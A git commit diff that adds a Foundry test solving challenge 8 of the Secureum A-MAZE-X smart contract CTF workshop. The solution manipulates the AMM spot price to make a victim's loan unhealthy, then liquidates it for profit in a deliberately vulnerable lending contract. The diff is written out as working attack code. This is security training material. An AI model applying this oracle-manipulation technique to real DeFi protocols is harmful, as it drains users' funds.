43b313b506765cced5bcc9d638a3e34a59facd31
0xdedo93 <andrea.dedominicis@me.com>
2023-12-14 12:42:37 +0100

    ✅ Solve 8 - Liquidatoooor 🔱🔱

--- README.md
+++ README.md
@@ -1,15 +1,6 @@
 # **Secureum A-MAZE-X Maison de la Chimie, DeFi Security Summit**
 
-## **A Smart Contract Security _Capture the Flag_ Workshop**
-
-![A-MAZE-X-Stanford-LOGO](./img/A-MAZE-X-Maison-de-la-Chimie.png)
-\*Hosted by [Defi Security Summit](https://defisecuritysummit.org) as part of **[Defi Security 101](https://defisecuritysummit.org/defi-101-2023/)\***\
-_Built with love by [eugenioclrc](https://github.com/eugenioclrc), [luksgrin](https://github.com/luksgrin), [PeterisPrieditis](https://github.com/PeterisPrieditis), [RomiRand](https://github.com/RomiRand) and [misirov](https://twitter.com/p_misirov)_\
-_Special thanks to [patrickd](https://github.com/patrickd-), [StErMi](https://github.com/StErMi), [tinchoabbate](https://github.com/tinchoabbate) and [Rajeev](https://twitter.com/0xrajeev) for reviewing, commenting and helping during the elaboration and design of this CTF Workshop_
-
----
-
-<br>
+Solving Secureum A-MAZE-X CTF using Foundry.
 
 - ✅ 1. Operation magic redemption 🪄🔮
 - ❌ 2. Mission Modern WETH: Rescue the Ether 🧗🧭
@@ -18,22 +9,17 @@ _Special thanks to [patrickd](https://github.com/patrickd-), [StErMi](https://gi
 - ❌ 5. Balloon Vault 🎈🎈
 - ❌ 6. Safe Yield? 🏦📈
 - ❌ 7. Crystal DAO 💎💎
-- ❌ 8. Liquidatoooor 🔱🔱
+- ✅ 8. Liquidatoooor 🔱🔱
+
+### How to run
 
 ```bash
 forge test --match-path test/ChallengeX.t.sol
 ```
 
-Alternatively, to check if all challenges have been solved, execute the following command:
+## **A Smart Contract Security _Capture the Flag_ Workshop**
 
-```bash
-bash isSolved.sh
-```
-
-which will return the test results for all challenges in order.
-
-If one wishes to have a more detailed prompt (i.e. to see the logged messages), it is necessary to increase the verbosity with `-vvvv`, for example:
-
-```bash
-forge test --match-path test/ChallengeX.t.sol -vvvv
-```
+![A-MAZE-X-Stanford-LOGO](./img/A-MAZE-X-Maison-de-la-Chimie.png)
+\*Hosted by [Defi Security Summit](https://defisecuritysummit.org) as part of **[Defi Security 101](https://defisecuritysummit.org/defi-101-2023/)\***\
+_Built with love by [eugenioclrc](https://github.com/eugenioclrc), [luksgrin](https://github.com/luksgrin), [PeterisPrieditis](https://github.com/PeterisPrieditis), [RomiRand](https://github.com/RomiRand) and [misirov](https://twitter.com/p_misirov)_\
+_Special thanks to [patrickd](https://github.com/patrickd-), [StErMi](https://github.com/StErMi), [tinchoabbate](https://github.com/tinchoabbate) and [Rajeev](https://twitter.com/0xrajeev) for reviewing, commenting and helping during the elaboration and design of this CTF Workshop_
--- test/Challenge8.t.sol
+++ test/Challenge8.t.sol
@@ -1,10 +1,10 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "forge-std/Test.sol";
-import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
-import {Oiler} from "../src/8_oiler/Oiler.sol";
-import {AMM} from "../src/8_oiler/AMM.sol";
+import 'forge-std/Test.sol';
+import { ERC20 } from '@openzeppelin/contracts/token/ERC20/ERC20.sol';
+import { Oiler } from '../src/8_oiler/Oiler.sol';
+import { AMM } from '../src/8_oiler/AMM.sol';
 
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
@@ -25,21 +25,21 @@ contract Challenge8Test is Test {
          */
         token = new ERC20("Token", "TKN");
         dai = new ERC20("DAI token", "DAI");
-        vm.label(address(token), "TKN");
-        vm.label(address(dai), "DAI");
+        vm.label(address(token), 'TKN');
+        vm.label(address(dai), 'DAI');
 
         /**
          * @notice Deploy contant prodcut AMM with a TOKEN <> DAI pair
          */
         amm = new AMM(address(token), address(dai));
-        vm.label(address(amm), "amm");
+        vm.label(address(amm), 'amm');
 
         /**
          * @notice Deploy Lending contract. Accepts 'TOKEN' as collateral and
          * mints a 'dTOKEN' underlying debt token.
          */
         oiler = new Oiler(address(token), address(amm));
-        vm.label(address(oiler), "oiler");
+        vm.label(address(oiler), 'oiler');
 
         /**
          * @notice Create 2 accounts and fund them.
@@ -47,8 +47,8 @@ contract Challenge8Test is Test {
          * - Superman starts with 200 TOKEN and 200 DAI,
          * Superman adds 100 of each to the pool.
          */
-        player = makeAddr("player");
-        superman = makeAddr("Super-man");
+        player = makeAddr('player');
+        superman = makeAddr('Super-man');
         deal(address(token), player, 100);
         deal(address(dai), player, 100);
         deal(address(token), superman, 200);
@@ -58,27 +58,25 @@ contract Challenge8Test is Test {
          * @notice Add liquidity to AMM pair.
          */
         vm.startPrank(superman);
-        token.approve(address(amm), type(uint256).max);
-        dai.approve(address(amm), type(uint256).max);
+        token.approve(address(amm), type(uint).max);
+        dai.approve(address(amm), type(uint).max);
         amm.addLiquidity(100, 100);
         vm.stopPrank();
     }
 
-
-    function testSolution()public {
+    function testSolution() public {
         // Victim set up
         vm.startPrank(superman);
         token.approve(address(oiler), 100);
-        oiler.deposit(100);
+        oiler.deposit(100); //$TOKEN
         oiler.maxBorrow(superman); // Always account for 2 Decimal places
-        oiler.borrow(75);
+        oiler.borrow(75); // _mint debt tokens
         oiler.healthFactor(superman);
         vm.stopPrank();
 
-
         // Player initial balance is of 100 $TOKEN and 100 $DAI
-        console.log("Initial token balance: ", token.balanceOf(player));
-        console.log("Initial dai balance: ", dai.balanceOf(player));
+        console.log('Initial token balance: ', token.balanceOf(player));
+        console.log('Initial dai balance: ', dai.balanceOf(player));
         vm.startPrank(player);
         /*////////////////////////////////////////////////////
         //            Add your attack logic below!          //
@@ -87,7 +85,34 @@ contract Challenge8Test is Test {
         // forge test --match-contract Challenge8Test -vvvv //
         ////////////////////////////////////////////////////*/
 
+        console.log('\n  superman Healthfactor before swap:', oiler.healthFactor(superman));
 
+        token.approve(address(amm), type(uint).max);
+        dai.approve(address(amm), type(uint).max);
+
+        amm.swap(address(token), 99);
+
+        console.log('superman Healthfactor  after swap:', oiler.healthFactor(superman));
+
+        Oiler.User memory supermanUserData = oiler.getUserData(superman);
+        console.log('\n  superman borrow: ', supermanUserData.borrow);
+        console.log('superman liquidated: ', supermanUserData.liquidated);
+        console.log('superman collateral: ', supermanUserData.collateral);
+
+        // // deposit something
+        token.approve(address(oiler), 1);
+        oiler.deposit(1); //$TOKEN
+        oiler.borrow(100);
+        oiler.liquidate(address(superman));
+        amm.swap(address(dai), 100);
+
+        Oiler.User memory playerUserData = oiler.getUserData(player);
+        console.log('\n  player borrow: ', playerUserData.borrow);
+        console.log('player liquidated: ', playerUserData.liquidated);
+        console.log('player collateral: ', playerUserData.collateral);
+
+        console.log('\n  After token balance: ', token.balanceOf(player));
+        console.log('After dai balance: ', dai.balanceOf(player));
 
         //==================================================//
         vm.stopPrank();
@@ -99,7 +124,5 @@ contract Challenge8Test is Test {
         Oiler.User memory victim = oiler.getUserData(superman);
         assertEq(victim.liquidated, true);
         assert(token.balanceOf(player) > 200);
-
     }
-
 }
